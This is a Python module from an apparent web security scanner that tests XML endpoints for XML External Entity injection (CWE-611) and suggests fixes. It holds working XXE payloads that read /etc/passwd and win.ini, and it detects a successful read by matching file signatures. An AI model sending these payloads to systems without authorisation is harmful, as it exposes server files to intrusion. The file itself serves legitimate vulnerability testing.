"""
XXEScanner — detects XML External Entity injection (CWE-611).

Probes XML endpoints with payloads designed to resolve external entities.
Detects vulnerabilities by checking if the server resolves local system files
(like /etc/passwd or C:/Windows/win.ini) into the response.

CWE-611: Improper Restriction of XML External Entity Reference
OWASP A05:2021 — Security Misconfiguration
"""

from __future__ import annotations

import logging
import time
from typing import List

import httpx

from cherenkov.core.base_scanner import BaseScanner, Finding, ScanResult, Severity

logger = logging.getLogger("cherenkov.scanners.xxe")

# Standard XXE payloads targeting common system files.
# Probing for /etc/passwd (Linux) and win.ini (Windows).
_XXE_PAYLOADS: list[str] = [
    # Classic File Read (Linux)
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    # Classic File Read (Windows)
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # General probe
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:1"> ]><test>&xxe;</test>',
]

# Signatures that indicate a successful file read.
_FILE_SIGNATURES: tuple[str, ...] = (
    "root:x:0:0:",  # /etc/passwd
    "[extensions]",  # win.ini
    "[fonts]",       # win.ini
)


class XXEScanner(BaseScanner):
    """
    Scanner to detect XML External Entity (XXE) vulnerabilities by probing
    with payloads that attempt to resolve local system files.
    """

    def __init__(self, name: str = "", description: str = ""):
        super().__init__(
            name or "xxe_scanner",
            description or "Detects XML External Entity injection (CWE-611)",
        )

    async def scan(self, target: str, timeout: float = 10.0) -> ScanResult:
        """Execute the scan - sending XML payloads to the target."""
        start = time.monotonic()
        findings: List[Finding] = []

        try:
            async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                for payload in _XXE_PAYLOADS:
                    try:
                        response = await client.post(
                            target,
                            content=payload,
                            headers={"Content-Type": "application/xml"},
                            follow_redirects=True,
                        )
                    except (httpx.RequestError, httpx.TimeoutException):
                        continue

                    body = response.text
                    matched_sig = next(
                        (sig for sig in _FILE_SIGNATURES if sig in body), None
                    )

                    if response.status_code == 200 and matched_sig:
                        findings.append(
                            Finding(
                                title="XML External Entity (XXE) Injection",
                                severity=Severity.HIGH,
                                description=(
                                    f"The application is vulnerable to XXE injection. "
                                    f"An external entity was successfully resolved, "
                                    f"exposing local file contents (matched '{matched_sig}')."
                                ),
                                cwe="CWE-611",
                                remediation=(
                                    "Disable external entity resolution in the XML parser. "
                                    "Use safe defaults (e.g., defusedxml for Python, or "
                                    "disabling DTDs/external entities in LibXML2/Jackson)."
                                ),
                                scanner="xxe_basic",
                            )
                        )
                        break  # One confirmed finding per target is sufficient

        except Exception as exc:
            logger.debug("XXE scan network/parse error for %s: %s", target, exc)

        duration_ms = (time.monotonic() - start) * 1000

        return ScanResult(
            target=target,
            scanner_name=self.name,
            findings=findings,
            duration_ms=duration_ms,
            status="completed",
        )
